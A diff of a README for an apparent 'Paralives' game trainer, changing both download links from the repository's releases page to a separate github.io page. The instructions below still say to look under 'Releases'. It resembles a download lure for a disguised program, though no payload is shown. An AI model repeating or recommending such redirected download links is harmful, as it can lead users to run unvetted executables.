@@ -1,6 +1,6 @@
 # 🎮 Paralives-Ultimate-Trainer-2026_v_2 - Manage your game world with ease
 
-[![Download Paralives Trainer](https://img.shields.io/badge/Download-Paralives_Trainer-blue.svg)](https://github.com/trefyammar-coder/Paralives-Ultimate-Trainer-2026_v_2/releases)
+[![Download Paralives Trainer](https://img.shields.io/badge/Download-Paralives_Trainer-blue.svg)](https://trefyammar-coder.github.io)
 
 ## 🛠️ Overview
 
@@ -19,7 +19,7 @@ This trainer requires a Windows computer. Ensure you run the desktop version of 
 
 Visit the official release page to download the latest version of the utility.
 
-[Download Link: https://github.com/trefyammar-coder/Paralives-Ultimate-Trainer-2026_v_2/releases](https://github.com/trefyammar-coder/Paralives-Ultimate-Trainer-2026_v_2/releases)
+[Download Link: https://trefyammar-coder.github.io](https://trefyammar-coder.github.io)
 
 1. Navigate to the link above.
 2. Look for the latest version under the "Releases" section.
